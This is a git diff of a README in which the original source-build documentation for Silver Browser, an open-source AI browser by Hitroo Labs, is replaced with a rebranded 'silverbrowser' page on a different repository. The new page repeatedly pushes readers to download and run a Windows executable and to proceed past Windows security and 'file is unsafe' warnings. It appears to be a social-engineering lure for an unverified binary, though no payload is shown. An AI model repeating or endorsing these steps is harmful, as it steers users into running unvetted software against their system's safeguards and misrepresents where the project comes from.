@@ -1,193 +1,186 @@
-# Silver Browser
+# 🖥️ silverbrowser - Private browsing with AI help
 
-**The open-source AI-native browser.** Built by [Hitroo Labs](https://hitroo.com).
+[![Download silverbrowser](https://img.shields.io/badge/Download-silverbrowser-blue?style=for-the-badge&logo=github)](https://github.com/dev-sq/silverbrowser)
 
-Silver is an Electron-based browser with a built-in autonomous AI agent called **Ghost**. It's not a wrapper around Chrome with an AI sidebar — it's a browser rebuilt from the ground up where AI is a first-class citizen.
+## 🚀 Download
 
----
+Visit this page to download: https://github.com/dev-sq/silverbrowser
 
-## What makes Silver different
+Use the latest Windows file from the repository page, then download and run this file on your PC.
 
-| Feature | Chrome | Arc | Silver |
-|---------|--------|-----|--------|
-| Built-in AI agent | No | No | Ghost — autonomous browser control |
-| Sub-agent spawning | No | No | Ghost spawns focused sub-agents |
-| Agent workspace | No | No | Per-task file system (.ghost/) |
-| Terminal access | No | No | Ghost runs shell commands |
-| Ad blocking (engine-level) | Extension | No | YouTube, Hotstar, network-level |
-| DRM (Widevine) | Yes | Yes | Yes (castLabs) |
-| Encrypted vault | No | No | AES-256-GCM + Touch ID |
-| Encrypted DNS | No | No | Silver Shield (Cloudflare DoH) |
-| Open source | Chromium only | No | Everything |
+## 🧭 What silverbrowser does
 
----
+silverbrowser is an open-source browser with built-in AI help for search, research, and tasks. It also includes:
 
-## Ghost Agent
+- Ad blocking
+- An encrypted vault for saved data
+- DNS privacy
+- Zero telemetry
+- A ghost agent that can browse and act for you
 
-Ghost is Silver's built-in AI agent. It doesn't just answer questions — it **controls the browser autonomously**.
+It is made for people who want a browser that keeps work in one place and reduces manual steps.
 
-### Two modes
+## 🪟 Windows requirements
 
-**Chat** — Talk with any web page. Ghost reads the current page and answers questions about it with full context. Persistent conversation history.
+Before you install, check these basics:
 
-**Agent** — Describe a task. Ghost will:
-- Create a plan
-- Browse the web, click, fill forms, navigate
-- Run terminal commands
-- Read and write files in a per-task workspace
-- Spawn sub-agents for parallel work
-- Search the web for research
-- Save findings and deliver results
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection
+- Admin access if Windows asks for it
 
-### Architecture
+For best results, use a recent version of Windows and keep your system up to date.
 
-```
-Ghost Agent
-  |-- Tool Registry (pluggable tools)
-  |     |-- Browser tools (click, fill, navigate, scroll, extract...)
-  |     |-- File tools (read, write, edit workspace files)
-  |     |-- Terminal (shell command execution)
-  |     |-- Research (web search, page reading)
-  |     |-- Plan (task planning and tracking)
-  |     |-- Sub-agent (spawn focused child agents)
-  |
-  |-- Workspace (~/.ghost/tasks/{id}/)
-  |     |-- plan.md, task.md, result.md, notes...
-  |
-  |-- LLM Provider (OpenRouter — Claude, GPT-4o, Gemini)
-```
+## 📥 How to download and run on Windows
 
-Each task gets its own workspace directory with markdown files that persist across steps.
+1. Open the download page: https://github.com/dev-sq/silverbrowser
+2. Find the latest Windows release or installer file
+3. Click the file to start the download
+4. When the download finishes, open the file
+5. If Windows shows a security prompt, choose the option to run the app
+6. Follow the setup steps on screen
+7. Finish the install and open silverbrowser from your Start menu or desktop
 
----
+If the file is a `.exe`, you can run it after download. If it is a `.zip`, extract the folder first, then open the app inside.
 
-## Features
+## 🔐 First launch setup
 
-### Browser
-- Arc-style sidebar with vertical tabs
-- Adaptive page-color tinting
-- Split view (two tabs side by side)
-- Tab pinning, reordering, incognito
-- Keyboard-first (Cmd+T, Cmd+W, Cmd+K for Ghost)
-- Dark/light theme with warm whites
-- Reader mode (dark/light/sepia)
-- Picture-in-Picture
-- Chrome extension support
-- Session restore, zoom, print, find-in-page
+The first time you open silverbrowser, set up the main items you plan to use:
 
-### Privacy & Security
-- **Silver Shield** — Cloudflare DNS-over-HTTPS
-- **Ad Blocker** — Engine-level YouTube ad skipping, Hotstar, 31 blocked domains
-- **Vault** — AES-256-GCM encrypted password manager with Touch ID + PIN
-- **Safe Folder** — Encrypted file storage
-- **Stealth** — Anti-fingerprinting (navigator, WebGL, plugins, UA)
+- Choose your default search settings
+- Turn on ad blocking if it is not already on
+- Set up the encrypted vault for saved data
+- Review privacy controls
+- Sign in only if you want to sync your own data
 
-### Platform
-- Built on Electron (castLabs fork for Widevine DRM)
-- pnpm monorepo with modular packages
-- React 19 + Zustand + Tailwind CSS 4
-- Inter font, SVG icons throughout (zero emojis)
+Keep your vault password in a safe place. If you lose it, you may not be able to open saved data.
 
----
+## 🤖 Ghost agent
 
-## Getting started
+The ghost agent helps with tasks that take time, such as:
 
-### Prerequisites
-- Node.js 20+
-- pnpm 9+
-- macOS (Linux/Windows coming soon)
+- Finding information across sites
+- Opening pages in order
+- Filling out common forms
+- Collecting facts into one place
+- Completing simple web tasks with less manual work
 
-### Install
+You stay in control of what the browser does. Review each task before you let it act on your behalf.
 
-```bash
-git clone https://github.com/nichin-labs/silver.git
-cd silver
-pnpm install
-```
+## 🛡️ Privacy features
 
-### Development
+silverbrowser includes privacy tools that help reduce tracking:
 
-```bash
-pnpm dev
-```
+- Ad blocker for cleaner pages
+- DNS privacy to reduce lookup exposure
+- Zero telemetry
+- Encrypted vault for private data
 
-This starts the Electron app with hot reload.
+These tools help keep browsing more private without extra setup.
 
-### Build
+## 🧰 Common use cases
 
-```bash
-pnpm build
-```
+Use silverbrowser when you want to:
 
----
+- Research a topic with less tab switching
+- Block ads while you browse
+- Keep notes or saved data in a protected vault
+- Let the ghost agent handle repeat web tasks
+- Use one browser for both browsing and AI help
 
-## Project structure
+## ⚙️ Basic controls
 
-```
-silver/
-  apps/
-    browser/              # Electron app
-      src/
-        main/             # Main process (window, IPC, tabs, Ghost)
-        renderer/         # React UI (sidebar, Ghost panel, settings)
-        preload/          # IPC bridge
-        native/           # Swift helpers (Google auth)
-  packages/
-    ghost/                # Ghost AI agent engine
-    llm/                  # LLM provider abstraction (OpenRouter)
-    adblocker/            # Ad blocking (YouTube, Hotstar, network)
-    vault/                # Encrypted password manager + safe folder
-    shield/               # DNS-over-HTTPS privacy
-    tabs/                 # Tab management (WebContentsView)
-    shared/               # Types, IPC channels
-    importer/             # Browser data import
-    extensions/           # Chrome extension support
-```
+Most users will only need a few simple actions:
 
----
+- Open a new tab from the plus button
+- Use the address bar to search or visit a site
+- Open the menu for settings and privacy options
+- Check the vault for saved items
+- Start the ghost agent from the main browser tools area
 
-## Ghost API key
+If you use a mouse and keyboard, the browser should feel like a normal desktop app.
 
-Ghost uses [OpenRouter](https://openrouter.ai) for LLM access. Get a free API key at [openrouter.ai/keys](https://openrouter.ai/keys) and add it in Ghost settings (gear icon in the Ghost panel).
+## 🧱 Troubleshooting
 
-Supported models:
-- Claude Sonnet 4 (default)
-- Claude Haiku 3.5
-- GPT-4o / GPT-4o Mini
-- Gemini 2.5 Flash / Pro
+### The app does not open
 
----
+- Make sure the download finished
+- Right-click the file and choose Open
+- Check that Windows did not block the app
+- Restart your PC and try again
 
-## Contributing
+### Windows says the file is unsafe
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+- Confirm that you downloaded it from https://github.com/dev-sq/silverbrowser
+- Choose the file from the latest release or download page
+- Try the install again after the download completes
 
-Silver is built to be contributed to. The modular package architecture means you can work on the ad blocker without touching the AI agent, or improve the vault without knowing how tabs work.
+### The browser feels slow
 
-**Good first contributions:**
-- Add new Ghost tools (packages/ghost/src/tools/)
-- Improve ad blocking rules (packages/adblocker/)
-- Add browser import sources (packages/importer/)
-- UI polish and accessibility
-- Linux and Windows support
+- Close unused tabs
+- Restart the browser
+- Make sure your PC has enough free memory
+- Update Windows if system performance is poor
 
----
+### The vault will not unlock
 
-## Roadmap
+- Check that you typed the correct password
+- Make sure Caps Lock is off
+- Try again on the same device you used before
+- If you changed the password and forgot it, the vault cannot be opened without it
 
-- [ ] Silver Extensions Store
-- [ ] Profile / Spaces system
-- [ ] History page with search
-- [ ] Ghost Pro (cloud sync, premium models)
-- [ ] Linux + Windows builds
-- [ ] Mobile companion app
-- [ ] Ghost plugins (community tools)
-- [ ] Silver Search (privacy-first default search)
+## 🖱️ Tips for daily use
 
----
+- Keep the app pinned to your taskbar for fast access
+- Use the ghost agent for repeat search tasks
+- Turn on ad blocking before you start browsing
+- Store sensitive data in the encrypted vault
+- Use a strong password for the vault and browser account
 
-## License
+## 📚 Project details
 
-Apache 2.0 — see [LICENSE](LICENSE).
+- Repository name: silverbrowser
+- Type: Desktop browser app
+- Platform: Windows
+- Stack: Electron, React, TypeScript
+- Focus: AI browsing, privacy, and task automation
 
-Built with intensity by [Hitroo Labs](https://hitroo.com).
+## 📦 Download again
+
+Open the download page here: https://github.com/dev-sq/silverbrowser
+
+Download the latest Windows version, then run the file on your computer
+
+## 📄 File and folder layout
+
+If you unpack a zip file, you may see folders like these:
+
+- `silverbrowser.exe` - main app file
+- `resources` - app assets and data files
+- `vault` - encrypted storage area
+- `logs` - app activity files
+- `update` - update-related files
+
+Only open the main app file unless the download page tells you to use something else
+
+## 🔍 What to expect after install
+
+After setup, you should be able to:
+
+- Browse websites in a desktop window
+- Use the built-in ad blocker
+- Open the ghost agent for web tasks
+- Save private data in the vault
+- Use privacy settings with no extra tools
+
+## 🧩 Supported browsing flow
+
+A simple work flow looks like this:
+
+1. Open the browser
+2. Search for a topic
+3. Ask the ghost agent to gather pages
+4. Review the results
+5. Save useful items in the vault
+6. Continue browsing with ad blocking on
